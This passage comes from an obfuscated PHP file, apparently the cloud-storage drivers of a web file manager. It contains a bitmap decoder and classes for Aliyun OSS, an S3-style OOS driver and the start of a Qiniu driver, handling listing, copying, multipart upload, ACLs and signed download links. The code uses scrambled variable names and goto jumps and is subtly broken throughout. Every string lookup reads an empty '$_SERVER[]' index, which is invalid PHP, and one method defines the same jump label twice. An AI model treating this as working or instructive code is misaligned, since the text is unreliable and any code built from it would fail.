imagedestroy($A֠); return !1; } for ($C̯ģ = 0, $fά = 0; $C̯ģ < $cڒ䊳ډ; ++$C̯ģ, ++$Ĉ, $fά += $D) { list(, $F㉖) = unpack($e[1826], $f[$fά >> 3]); $eȲ焍 = $fά & 7; imagesetpixel($A֠, $Ĉ, $aк, $a˰ɾ[($F㉖ & $C󴛰 >> $eȲ焍) >> $fճ - $eȲ焍]); } break; } break; default: $bݺȒ = fread($Dķ, 1); if ($bݺȒ === !1) { imagedestroy($A֠); return !1; } list(, $E攺, $F㉖) = unpack($e[1825], $f . $bݺȒ); for ($C̯ģ = 0, $fά = 0; $C̯ģ < $E攺; ++$C̯ģ, ++$Ĉ, $fά += $D) { $eȲ焍 = $fά & 7; imagesetpixel($A֠, $Ĉ, $aк, $a˰ɾ[($F㉖ & $C󴛰 >> $eȲ焍) >> $fճ - $eȲ焍]); } break; } } } else { for ($B = 0; $B < $d; ++$B, $aк += $a׶) { $f = fread($Dķ, $f쇽); if ($f === !1) { imagedestroy($A֠); return !1; } $fά = 0; for ($Ĉ = 0; $Ĉ < $Ḅ; ++$Ĉ, $fά += $D) { list(, $F㉖) = unpack($e[1826], $f[$fά >> 3]); $eȲ焍 = $fά & 7; imagesetpixel($A֠, $Ĉ, $aк, $a˰ɾ[($F㉖ & $C󴛰 >> $eȲ焍) >> $fճ - $eȲ焍]); } } } goto eïȊ; eïȊ: } else { goto b; b: $A֠ = imagecreatetruecolor($Ḅ, $d); imagealphablending($A֠, !1); if ($BÅ) { imagesavealpha($A֠, !0); } goto E; B: for ($B = 0; $B < $d; ++$B, $aк += $a׶) { $f = fread($Dķ, $f쇽); if ($f === !1) { imagedestroy($A֠); return !1; } $fά = 0; for ($Ĉ = 0; $Ĉ < $Ḅ; ++$Ĉ, $fά += $Aܾ) { list(, $F㉖) = unpack($e[1803], substr($f, $fά, $Aܾ) . $e[1827]); $eϗߜ = $F㉖ & $BÅ; $d = $F㉖ & $Dђ; $aҧ = $F㉖ & $E⹹; $CႳ = $F㉖ & $eۺ塼; $Dܔ = $dް - (($eϗߜ << 7) - $eϗߜ) * $d; $Cᕑ = (($d << 8) - $d) * $F矘; $Aٶ = (($aҧ << 8) - $aҧ) * $F˥ж; $eȲ焍 = (($CႳ << 8) - $CႳ) * $c҅ڌ; imagesetpixel($A֠, $Ĉ, $aк, $Dܔ << 24 | $Cᕑ << 16 | $Aٶ << 8 | $eȲ焍); } } imagealphablending($A֠, !0); goto Dߨ; E: $Aܾ = $D >> 3; $dް = $BÅ ? 127 : 0; $d = $BÅ ? 1 / $BÅ : 1; goto e픹; e픹: $F矘 = $Dђ ? 1 / $Dђ : 1; $F˥ж = $E⹹ ? 1 / $E⹹ : 1; $c҅ڌ = $eۺ塼 ? 1 / $eۺ塼 : 1; goto B; Dߨ: } return $A֠; goto aǎ; E㯈: $d = abs($aѪ); $aк = $aѪ > 0 ? $d - 1 : 0; $a׶ = $aѪ > 0 ? -1 : 1; goto B; B߄: if ($Ḅ == 0 || $aѪ == 0 || $F != 1 || ($BÅ & $Dђ) != 0 || ($BÅ & $E⹹) != 0 || ($BÅ & $eۺ塼) != 0 || ($Dђ & $E⹹) != 0 || ($Dђ & $eۺ塼) != 0 || ($E⹹ & $eۺ塼) != 0) { return !1; } if ($A⾈ѵ == 4 || $A⾈ѵ == 5) { $f = stream_get_contents($Dķ, $bÃ); if ($f === !1) { return !1; } return imagecreatefromstring($f); } $f쇽 = $Ḅ * $D + 31 >> 3 & ~3; goto E㯈; Cѩ: $e =& $_SERVER[]; if ($a[$e[384]] != 19778) { return !1; } $f = fread($Dķ, 4); goto a; aǎ: } } goto B; Cꥆ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($C̿) { parent::__construct($C̿); $this->signatureVersion($_SERVER[][196]); } public function fileOutLink($E) { $EÇ =& $_SERVER[]; if (substr($E, 0, 7) == $EÇ[1095]) { $E = $EÇ[1096] . substr($E, 7); } header($EÇ[152] . $E); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Eދ) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1150]; $this->_init($Eދ); } public function _init($f) { foreach ($f as $D => $e) { if (isset($this->{$D})) { $this->{$D} = $e; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[][1151], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto b; b: $e扨 =& $_SERVER[]; $b = new OSS\Model\CorsConfig(); $B = new OSS\Model\CorsRule(); goto f; C: $b->addRule($B); try { $this->client->putBucketCors($this->bucket, $b); } catch (OSS\Core\OssException $F넑) { return !1; } return !0; goto bˢꐼ; fƑ: $B->setMaxAgeSeconds(600); $B->addExposeHeader($e扨[1157]); $B->addAllowedHeader($e扨[1152]); goto C; cː: $B->addAllowedMethod($e扨[1155]); $B->addAllowedMethod($e扨[1156]); $B->addAllowedMethod($e扨[151]); goto fƑ; f: $B->addAllowedOrigin($e扨[1152]); $B->addAllowedMethod($e扨[1153]); $B->addAllowedMethod($e扨[1154]); goto cː; bˢꐼ: } public function getBucketCors() { goto A; A: $a˹ =& $_SERVER[]; $cʾ = null; try { $cʾ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $a֏) { return null; } goto bɧӘ; bɧӘ: if (!$cʾ || !($Cؚ = $cʾ->getRules())) { return null; } $A̮޳ = $Cؚ[0]->getAllowedOrigins(); $C﹍ = $Cؚ[0]->getAllowedMethods(); goto E; Eڥ: return array($a˹[171] => isset($A̮޳[0]) ? $A̮޳[0] : $a˹[33], $a˹[175] => $C﹍, $a˹[1158] => $AϷ, $a˹[1159] => isset($eλ[0]) ? $eλ[0] : $a˹[33], $a˹[173] => isset($aܻ[0]) ? $aܻ[0] : $a˹[33]); goto E߷·; E: $AϷ = $Cؚ[0]->getMaxAgeSeconds(); $eλ = $Cؚ[0]->getExposeHeaders(); $aܻ = $Cؚ[0]->getAllowedHeaders(); goto Eڥ; E߷·: } public function isBucketCors() { goto f͉; c: if ($Eꈶ[$a[171]] != $a[172] || $Eꈶ[$a[173]] != $a[172]) { return !1; } $eٱݧ = array_map($a[174], $Eꈶ[$a[175]]); if (!is_array($eٱݧ)) { $eٱݧ = array(); } goto E켇ʮ; E켇ʮ: $E𻋈 = array($a[176], $a[177], $a[178], $a[179], $a[180]); $dُ = array_diff($E𻋈, $eٱݧ); return empty($dُ); goto Bվĉ; f͉: $a =& $_SERVER[]; $Eꈶ = $this->getBucketCors(); if (!$Eꈶ || !is_array($Eꈶ)) { return !1; } goto c; Bվĉ: } public function mkfile($E܋, $F = '', $A = REPEAT_RENAME) { $bֶ = $this->setContent($E܋, $F); if ($bֶ !== !1) { return $this->getPathOuter($E܋); } return !1; } public function mkdir($B޻, $CǼ = REPEAT_SKIP) { if ($this->_isFolder($B޻)) { return $this->getPathOuter($B޻); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($B޻)); } catch (OSS\Core\OssException $f) { return !1; } return $this->getPathOuter($B޻); } private function fileList($Bҩ, $A = '', $dƳ = 0) { goto Eо; Eо: $B̝ =& $_SERVER[]; $Bҩ = trim($Bҩ, $B̝[8]); $e = empty($Bҩ) ? $B̝[33] : $Bҩ . $B̝[8]; goto E; E: $Cʶ = $B̝[33]; $A޴ = 1000; $E = $Eܪ׻ = array(); goto c; c: while (!0) { $c = array($B̝[1160] => $A, $B̝[182] => $e, $B̝[1161] => $A޴, $B̝[1162] => $Cʶ); try { $C̶ = $this->client->listObjects($this->bucket, $c); } catch (OSS\Core\OssException $d놳) { break; } $Cʶ = $C̶->getNextMarker(); $A = $C̶->getObjectList(); $b終 = $C̶->getPrefixList(); foreach ($A as $Cߨβ) { if ($Cߨβ->getKey() == $e) { continue; } $c񕯩ɪ = $Cߨβ->getKey(); if ($dƳ) { $c񕯩ɪ = array($B̝[28] => $c񕯩ɪ, $B̝[77] => $Cߨβ->getSize(), $B̝[186] => strtotime($Cߨβ->getLastModified())); } $Eܪ׻[] = $c񕯩ɪ; } foreach ($b終 as $Aפ») { $E[] = $Aפ»->getPrefix(); } if ($Cʶ === $B̝[33]) { break; } } return array($B̝[74] => $E, $B̝[73] => $Eܪ׻); goto A; A: } public function copyFile($Dɦ, $fϝƽ) { $bÇއ = $this->size($Dɦ); if ($bÇއ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Dɦ, $this->bucket, $this->pathEncode($fϝƽ)); } catch (OSS\Core\OssException $B) { return !1; } return !0; } return $this->multiCopyObject($Dɦ, $fϝƽ, $bÇއ); } private function multiCopyObject($Bȃ, $B߶, $B) { $B =& $_SERVER[]; try { goto A֘; D: $e醳Ь = 1024 * 1024 * 10; $e = $this->client->generateMultiuploadParts($B, $e醳Ь); foreach ($e as $D => $e鏤) { $Eʻ = $FӘ + (int) $e鏤[$B[1164]]; $aݟȝ = (int) $e鏤[$B[321]] + $Eʻ - 1; $C󐊌 = array($B[1165] => $Eʻ, $B[1166] => $aݟȝ); $F昏[] = $this->client->uploadPartCopy($this->bucket, $Bȃ, $this->bucket, $this->pathEncode($B߶), $dʜ, $eՎ, $C󐊌); $dʜ = $dʜ + 1; } goto fʇ; fʇ: $Aޮڰ = array(); foreach ($F昏 as $D => $e̾Ω) { $Aޮڰ[] = array($B[1167] => $D + 1, $B[1168] => $e̾Ω); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($B߶), $eՎ, $Aޮڰ); goto Dǔ; FĤн: $dʜ = 1; $FӘ = 0; $F昏 = array(); goto D; A֘: $EƱ = array(); if ($Bꕳڼ = $this->hashMd5($Bȃ)) { $EƱ = array(OSS\OssClient::OSS_HEADERS => array($B[1163] => $Bꕳڼ)); } $eՎ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B߶), $EƱ); goto FĤн; Dǔ: } catch (OSS\Core\OssException $CɓǠ) { return !1; } return !0; } public function moveFile($d۶, $Eġ) { if ($this->copyFile($d۶, $Eġ)) { $this->remove($d۶); return !0; } return !1; } public function delFile($D΅) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($D΅)); } catch (OSS\Core\OssException $f߲) { return !1; } return !0; } public function delFolder($a) { $DÉ =& $_SERVER[]; $F߯ɡ = $this->fileList($a); if (!empty($a) && !in_array(trim($a, $DÉ[8]) . $DÉ[8], $F߯ɡ[$DÉ[73]])) { $F߯ɡ[$DÉ[73]][] = trim($a, $DÉ[8]) . $DÉ[8]; } foreach (array_chunk($F߯ɡ[$DÉ[73]], 1000) as $CݓÎ) { try { $this->client->deleteObjects($this->bucket, $CݓÎ); } catch (OSS\Core\OssException $D󩗿) { continue; } } return !0; } public function rename($Bʕ, $F̟) { return $this->renameObject($Bʕ, $F̟); } private function fileInfo($D׆ԑ޿, $b粌 = array()) { goto A㢄; Cˮ: if (isset($b粌[$c⃖[77]])) { $eե֬[$c⃖[77]] = $b粌[$c⃖[77]]; } if (isset($b粌[$c⃖[106]])) { $eե֬[$c⃖[106]] = $b粌[$c⃖[106]]; } if (isset($b粌[$c⃖[186]]) && !trim($eե֬[$c⃖[106]])) { $eե֬[$c⃖[106]] = $b粌[$c⃖[186]]; } goto B; A㢄: $c⃖ =& $_SERVER[]; $eե֬ = array($c⃖[28] => $this->pathThis($D׆ԑ޿), $c⃖[75] => $this->getPathOuter($D׆ԑ޿), $c⃖[29] => $c⃖[163], $c⃖[183] => 0, $c⃖[106] => 0, $c⃖[77] => 0, $c⃖[156] => $this->ext($D׆ԑ޿), $c⃖[184] => !0, $c⃖[185] => !0); if (empty($b粌)) { $Dأ = $this->objectMeta($D׆ԑ޿); if (!$Dأ) { return $eե֬; } $b粌 = array($c⃖[106] => strtotime($Dأ[$c⃖[1169]]), $c⃖[77] => $Dأ[$c⃖[1170]] + 0); } goto Cˮ; B: return $eե֬; goto e۷; e۷: } private function folderInfo($FĄ, $Bɜ = array()) { $a =& $_SERVER[]; $cɮ = array($a[28] => $this->pathThis($FĄ), $a[75] => $this->getPathOuter($a[8] . $FĄ), $a[29] => $a[76], $a[183] => 0, $a[106] => 0, $a[184] => !0, $a[185] => !0); if (empty($Bɜ)) { $FĄ = rtrim($FĄ, $a[8]) . $a[8]; $AÉ = $this->objectMeta($FĄ); if (!$AÉ) { return $cɮ; } $Bɜ = array($a[183] => $AÉ[$a[1171]][$a[1172]], $a[106] => strtotime($AÉ[$a[1169]])); } if (isset($Bɜ[$a[106]])) { $cɮ[$a[106]] = $Bɜ[$a[106]]; } if (isset($Bɜ[$a[183]])) { $cɮ[$a[183]] = $Bɜ[$a[183]]; } return $cɮ; } public function listPath($CƱ, $bեЄ = false) { $e =& $_SERVER[]; $E혭͹ = $this->fileList($CƱ, $e[8], !0); foreach ($E혭͹[$e[74]] as $bʴ => $c) { $E혭͹[$e[74]][$bʴ] = $this->folderInfo($c, $c); } foreach ($E혭͹[$e[73]] as $bʴ => $c) { $E혭͹[$e[73]][$bʴ] = $this->fileInfo($c[$e[28]], $c); } return $E혭͹; } public function has($e©, $e = false, $Fʲ = true) { goto bԱΈ; Aѡ: $b΃ = 0; while (!0) { $F = array($E[1160] => $E[8], $E[182] => $C, $E[1161] => $eǳ, $E[1162] => $e򤈉); try { $Fш = $this->client->listObjects($this->bucket, $F); } catch (OSS\Core\OssException $b㼯) { break; } $e򤈉 = $Fш->getNextMarker(); $C٘ = $Fш->getObjectList(); $Eۧ = $Fш->getPrefixList(); if ($e) { if (count($C٘) > 1 || count($C٘) == 1 && $C٘[0]->getKey() != $C) { $A += count($C٘) - 1; } if (!empty($Eۧ)) { $b΃ += count($Eۧ); } if ($e򤈉 === $E[33]) { break; } continue; } if ($Fʲ) { if (!empty($C٘)) { if (count($C٘) > 1 || $C٘[0]->getKey() != $C) { return !0; } } } else { if (!empty($Eۧ)) { return !0; } } if ($e򤈉 === $E[33]) { break; } } if ($e) { return array($E[187] => $A, $E[188] => $b΃); } goto bꢃ; bꢃ: return !1; goto Fϫ; bԱΈ: $E =& $_SERVER[]; $e© = trim($e©, $E[8]); $C = empty($e©) ? $E[33] : $e© . $E[8]; goto eѬ梶ɐ; eѬ梶ɐ: $e򤈉 = $E[33]; $eǳ = 500; $A = 0; goto Aѡ; Fϫ: } public function listAll($A؛) { $aۑ =& $_SERVER[]; $aɈ = $this->fileList($A؛, $aۑ[33], !0); $e¬՝ = array(); foreach ($aɈ[$aۑ[73]] as $D򗿏) { $e¬՝[$D򗿏[$aۑ[28]]] = $D򗿏[$aۑ[77]]; } return $this->listAllFiles($A؛, array_keys($e¬՝), $e¬՝); } public function canRead($A韽) { $Bݍ =& $_SERVER[]; $AԸڸ = $this->pathAcl($A韽); return $AԸڸ == $Bݍ[1173] || $AԸڸ == $Bݍ[487] ? !0 : !1; } public function canWrite($Aǔ) { $A؇ = $this->pathAcl($Aǔ); return $A؇ == $_SERVER[][487] ? !0 : !1; } public function pathAcl($E) { goto c; cɅ: return $A񟣊Ӌ; goto a߄; FѠ: $A񟣊Ӌ = $Cۋ == $e[34] ? $this->bucketAcl : $Cۋ; if ($A񟣊Ӌ == $e[1174]) { return $e[1173]; } if ($A񟣊Ӌ == $e[1175]) { return $e[487]; } goto cɅ; c: $e =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Cۋ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($E)); } catch (OSS\Core\OssException $a) { return !1; } goto FѠ; a߄: } private function chmodPath($a܆ߵ, $dς = '') { $DˌΕ =& $_SERVER[]; $fܱз = empty($dς) ? $DˌΕ[1175] : $dς; $e꒨ = array($DˌΕ[34], $DˌΕ[181], $DˌΕ[1174], $DˌΕ[1175]); if (!in_array($fܱз, $e꒨)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($a܆ߵ), $fܱз); } catch (OSS\Core\OssException $C) { return !1; } return !0; } public function getContent($f՛ؚԼ) { return $this->fileSubstr($f՛ؚԼ, -1); } public function setContent($Cՠģ, $bﳸќ = '') { $C =& $_SERVER[]; try { $Bͦŋ = $this->trafficLimit($C[1176]); $A陉 = $this->client->putObject($this->bucket, $this->pathEncode($Cՠģ), $bﳸќ, $Bͦŋ); } catch (OSS\Core\OssException $a) { return !1; } $a츯 = array($C[1163] => trim($A陉[$C[1177]], $C[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Cՠģ))); $this->updateObjMeta($Cՠģ, $a츯); return isset($A陉[$C[1178]][$C[1125]]) ? (int) $A陉[$C[1178]][$C[1125]] : strlen($A陉); } private function updateObjMeta($F蔰, $aɘ) { $F蔰 = $this->pathEncode($F蔰); try { $A = array(OSS\OssClient::OSS_HEADERS => $aɘ); $this->client->copyObject($this->bucket, $F蔰, $this->bucket, $F蔰, $A); } catch (OSS\Core\OssException $c٩) { return !1; } return !0; } public function upload($F, $B󧅕ɯ, $FЛ = false, $E⅑ = REPEAT_REPLACE) { $cӐ =& $_SERVER[]; $bٗ = trim($F, $cӐ[8]); $Dͅ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($cӐ[1163] => @md5_file($B󧅕ɯ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($F))); $Dͅ = $this->trafficLimit($cӐ[1176], $Dͅ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($bٗ), $B󧅕ɯ, $Dͅ); } catch (OSS\Core\OssException $B℠) { return !1; } return $this->getPathOuter($F); } public function getHost() { $d =& $_SERVER[]; $C̙揪 = explode($d[167], parent::getHost()); return $C̙揪[0] . $d[167] . $this->bucket . $d[91] . $C̙揪[1]; } public function uploadFormData($eûۘ, $dᖘ = 3600) { goto c; c: $Că =& $_SERVER[]; if (!($A˞ԛ = $this->getHost())) { return !1; } $aä = $dᖘ; goto c; C뻹: $E͐ = $this->pathFather($eûۘ); $Dȟ = array($Că[1082] => $c䌠, $Că[1083] => array(array($Că[1181], 0, $Aƞţ), array($Că[1086], $Că[1087], $E͐))); $F畹Ա = base64_encode(json_encode($Dȟ)); goto F; c: $c⍮ = date($Că[1179], time() + $aä); $c⫔ = new DateTime($c⍮); $c䌠 = $c⫔->format(DateTime::ISO8601); goto CӴԫ; F: $Fՠ = base64_encode(hash_hmac($Că[214], $F畹Ա, $this->secret, !0)); $d = array($Că[1092] => $F畹Ա, $Că[1182] => $this->accessKey, $Că[1088] => $Că[1080], $Că[1183] => $Fՠ, $Că[165] => $A˞ԛ); $d = $this->trafficLimit($Că[1176], $d); goto c; CӴԫ: $Dᘮ = strpos($c䌠, $Că[280]); $c䌠 = substr($c䌠, 0, $Dᘮ) . $Că[1180]; $Aƞţ = 1048576000 * 5; goto C뻹; c: return $d; goto e莢; e莢: } public function multiUploadFormData($aĐ, $D崗 = 3600) { $bڣ =& $_SERVER[]; if (!($d㵚 = $this->getHost())) { return !1; } $a޻ï = $this->trafficLimit($bڣ[1176]); $D = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aĐ), $a޻ï); return array($bڣ[205] => $D, $bڣ[165] => $d㵚 . $bڣ[8] . $this->pathEncode($aĐ), $bڣ[206] => gmdate($bڣ[1184]), $bڣ[89] => $aĐ); } public function multiUploadAuthData($f驢, $cީ = array()) { goto C̉; C: if (!empty($cީ[$E؋[1186]])) { $f = array_merge(array($Eֿ[4]), $cީ[$E؋[1186]]); sort($f); $Eֿ[4] = implode($E؋[213], $f); } $Dاҵ = implode($E؋[213], $Eֿ); $Eˌ = base64_encode(hash_hmac($E؋[214], $Dاҵ, $this->secret, !0)); goto c; Cðߣ: $a۫ = $f驢; if (isset($cީ[$E؋[89]])) { $a۫ = $cީ[$E؋[89]]; unset($cީ[$E؋[89]]); } if (isset($cީ[$E؋[207]])) { $cީ[$E؋[206]] = $D͖; return $this->listUploadParts($a۫, $cީ); } goto B; C̉: $E؋ =& $_SERVER[]; $D͖ = isset($cީ[$E؋[206]]) ? $cީ[$E؋[206]] : gmdate($E؋[1184]); $F = isset($cީ[$E؋[156]]) ? $cީ[$E؋[156]] : $E؋[33]; goto Cðߣ; c: $D = $E؋[1187] . $this->accessKey . $E؋[4] . $Eˌ; if (strpos($F, $E؋[209]) === 0) { $D = array($E؋[216] => $D, $E؋[206] => $D͖); if ($A󰈊) { $D = array_merge($D, $A󰈊); } } return $D; goto E׆; B: $Eֿ = array($E؋[208], $E؋[33], $E؋[115], $D͖, "\x78\55\x6f\163\x73\55\144\x61\x74\145\x3a{$D͖}", $E؋[8] . $this->bucket . $E؋[8] . $a۫ . $F); if (strpos($F, $E؋[209]) === 0) { $Eֿ[0] = $E؋[210]; if ($A󰈊 = $this->trafficLimit($E؋[1176])) { $a۫ = $E؋[1185]; array_splice($Eֿ, 5, 0, $a۫ . $E؋[4] . $A󰈊[$a۫]); } } if (isset($cީ[$E؋[211]]) && $cީ[$E؋[211]] == $E؋[212]) { $Eֿ[0] = $E؋[212]; } goto C; E׆: } public function listUploadParts($fЏ, $c ) { goto e֨; a: $Bֵ = $BǪ->getListPart(); $E믗 = array(); foreach ($Bֵ as $C) { $E믗[] = array($a[1167] => $C->getPartNumber(), $a[1168] => trim($C->getETag(), $a[112])); } goto b; E腭Ӣ: return array($a[216] => $d, $a[206] => $c [$a[206]], $a[218] => $E믗); goto Cޠ; e֨: $a =& $_SERVER[]; $Aؽѫ = parse_url_query($c [$a[156]]); $BǪ = $this->client->listParts($this->bucket, $this->pathEncode($fЏ), $Aؽѫ[$a[205]]); goto a; b: unset($c [$a[207]], $c [$a[211]]); $d = $this->multiUploadAuthData($fЏ, $c ); if (empty($d)) { return !1; } goto E腭Ӣ; Cޠ: } public function download($bʉ, $B鹬) { if ($this->isFolder($bʉ)) { return !1; } try { $Fǐ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $B鹬); $Fǐ = $this->trafficLimit($_SERVER[][104], $Fǐ); $this->client->getObject($this->bucket, $this->pathEncode($bʉ), $Fǐ); } catch (OSS\Core\OssException $Fڨ) { return !1; } return $B鹬; } public function fileSubstr($dÕ, $E֡ = 0, $Eވ = false) { if ($E֡ === -1) { $B = array(); } else { if ($Eވ === !1) { $E = $this->size($dÕ); } else { $E = $E֡ + $Eވ - 1; } $B = array(OSS\OssClient::OSS_RANGE => "{$E֡}\55{$E}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($dÕ), $B); } catch (OSS\Core\OssException $F) { think_exception($F->getMessage()); return !1; } } private function trafficLimit($dӹ, $eֈ = array()) { goto Bَ; b: return $eֈ; goto cƽÎ; Bَ: $bܕܩ =& $_SERVER[]; if ($dӹ == $bܕܩ[1176] && $this->isUploadServer() || $dӹ == $bܕܩ[104] && $this->isFileOutServer()) { return $eֈ; } $e = floatval($GLOBALS[$bܕܩ[6]][$bܕܩ[84]][$bܕܩ[102]][$dӹ]) * 1024 * 1024 * 8; goto e孂; e孂: if (!$e) { return $eֈ; } $e = $e < 819200 ? 819200 : ($e > 838860800 ? 838860800 : $e); $eֈ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($e); goto b; cƽÎ: } public function link($Aآ, $E忬 = array()) { $FϞ =& $_SERVER[]; if (!$this->exist($Aآ) || $this->isFolder($Aآ)) { return !1; } try { $E忬 = $this->trafficLimit($FϞ[104], $E忬); $cĘ = $this->client->signUrl($this->bucket, $this->pathEncode($Aآ), 3600 * 12, $FϞ[212], $E忬); return $this->getCdnLink($cĘ); } catch (OSS\Core\OssException $eÐ) { return !1; } } public function fileOut($Eٌ, $c = false, $dΙ = false, $eɡǸת = '') { goto AĈ; Aʷ: $Cˣþ = array(OSS\OssClient::OSS_SUB_RESOURCE => $dߎ[1188] . rawurlencode("{$c}\x3b\146\151\154\x65\x6e\x61\155\x65\75{$dΙ}")); $Cˣþ[OSS\OssClient::OSS_SUB_RESOURCE] .= $dߎ[1189] . rawurlencode($d҄); $e = $this->link($Eٌ, $Cˣþ); goto F; AĈ: $dߎ =& $_SERVER[]; if (!$dΙ) { $dΙ = $this->pathThis($Eٌ); } $dΙ = rawurlencode($dΙ); goto EԎ; F: $this->fileOutLink($e); goto b͌ط; EԎ: $d҄ = get_file_mime(get_path_ext($dΙ)); if ($d҄ == $dߎ[197]) { return parent::fileOut($Eٌ, $c, $dΙ, $eɡǸת); } $c = $c ? $dߎ[198] : $dߎ[199]; goto Aʷ; b͌ط: } public function fileOutServer($EϤ, $Eضߣ = false, $a覈 = false, $b萲 = '') { parent::fileOut($EϤ, $Eضߣ, $a覈, $b萲); } public function fileOutImage($Fҧ, $aǡ = 250) { $B͋ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1190] . $aǡ); $AǼ = $this->link($Fҧ, $B͋); $this->fileOutLink($AǼ); } public function fileOutImageServer($F, $C٫ = 250) { parent::fileOutImage($F, $C٫); } public function fileOutLink($Č) { $aʃ΃ =& $_SERVER[]; if (!$this->isCdnHost() && substr($Č, 0, 7) == $aʃ΃[1095]) { $Č = $aʃ΃[1096] . substr($Č, 7); } header($aʃ΃[152] . $Č); die; } public function hashMd5($bն, $Bǯ = '') { $e =& $_SERVER[]; $A = $this->objectMeta($bն); if (!$A) { return $e[33]; } if (!isset($A[$e[1163]]) && !empty($Bǯ)) { $eٹ = $this->updateObjMeta($bն, array($e[1163] => $Bǯ)); $A[$e[1163]] = $eٹ ? $Bǯ : $e[33]; } return isset($A[$e[1163]]) ? strtolower($A[$e[1163]]) : $e[33]; } public function size($a) { $E = $this->objectMeta($a); return $E ? $E[$_SERVER[][77]] : 0; } public function info($dԋ) { if ($this->isFolder($dԋ)) { return $this->folderInfo($dԋ); } else { if ($this->isFile($dԋ)) { return $this->fileInfo($dԋ); } } return !1; } public function exist($dԴ) { return $this->isFile($dԴ) || $this->isFolder($dԴ); } public function isFile($Dǃ) { return !$this->isFolder($Dǃ) && $this->objectMeta($Dǃ); } public function isFolder($E֐) { return $this->cacheMethod($_SERVER[][219], $E֐); } protected function objectMeta($b˗) { return $this->cacheMethod($_SERVER[][220], $b˗); } protected function _objectMeta($d鴮) { $d­ =& $_SERVER[]; try { $F͋ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($d鴮)); } catch (OSS\Core\OssException $eޛ) { $F͋ = !1; } if ($F͋) { $F͋[$d­[77]] = intval($F͋[$d­[1170]]); } return $F͋; } protected function _isFolder($B͏) { $cђ =& $_SERVER[]; if ($B͏ == $cђ[33] || $B͏ == $cђ[8]) { return !0; } $d̒ = array($cђ[1160] => $cђ[8], $cђ[182] => rtrim($B͏, $cђ[8]) . $cђ[8], $cђ[1161] => 1, $cђ[1162] => $cђ[33]); $DȌ = $this->client->listObjects($this->bucket, $d̒); if ($DȌ->getObjectList() || $DȌ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($DႫӛ) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1191]; $this->_init($DႫӛ); } public function _init($D) { foreach ($D as $aȃ => $C) { if (isset($this->{$aȃ})) { $this->{$aȃ} = $C; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[][1192], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Eӈ, $Eх։ = '', $f = REPEAT_RENAME) { if ($this->setContent($Eӈ, $Eх։)) { return $this->getPathOuter($Eӈ); } return !1; } public function mkdir($F׋, $fܙ = REPEAT_SKIP) { goto Aʋὅ; e՝Ґ: if (!$this->mkfile($B썹ܑ)) { return !1; } if (!$this->moveFile($B썹ܑ, $F׋)) { $this->delFile($B썹ܑ); return !1; } return $this->getPathOuter($a); goto Aѩ; C֏: $F׋ = $a . $cꋛ[8]; $Fœ = get_path_this($a); $B썹ܑ = $F׋ . $Fœ; goto e՝Ґ; Aʋὅ: $cꋛ =& $_SERVER[]; $a = trim($F׋, $cꋛ[8]); if ($this->_isFolder($a)) { return $this->getPathOuter($a); } goto C֏; Aѩ: } public function copyFile($Aϖ, $eȅ) { $b = $this->bucketManager->copy($this->bucket, $Aϖ, $this->bucket, $eȅ, !0); return $b ? !1 : !0; } public function moveFile($C, $D) { $DɄ = $this->bucketManager->move($this->bucket, $C, $this->bucket, $D, !0); return $DɄ ? !1 : !0; } public function delFile($dͨ) { $fͰ = $this->bucketManager->delete($this->bucket, $dͨ); return $fͰ ? !1 : !0; } public function delFolder($aĂ) { $e = $this->fileList($aĂ); if (empty($e)) { return !0; } $Bظڡ = 1000; if (count($e) <= $Bظڡ) { return $this->qnDelObj($e) ? !1 : !0; } foreach (array_chunk($e, $Bظڡ) as $d) { $E = $this->qnDelObj($d); if ($E) { return !1; } } return !0; } private function qnDelObj($a) { $F߹ = $this->bucketManager->buildBatchDelete($this->bucket, $a); list($Eޓɱ, $e۔) = $this->bucketManager->batch($F߹); return $e۔; } private function fileList($D𵺏, $Bل = 0) { goto d; c砋: $Aˡ飯 = $B[33]; $eר = 1000; $Cߣ = $B[33]; goto F̧; d: $B =& $_SERVER[]; 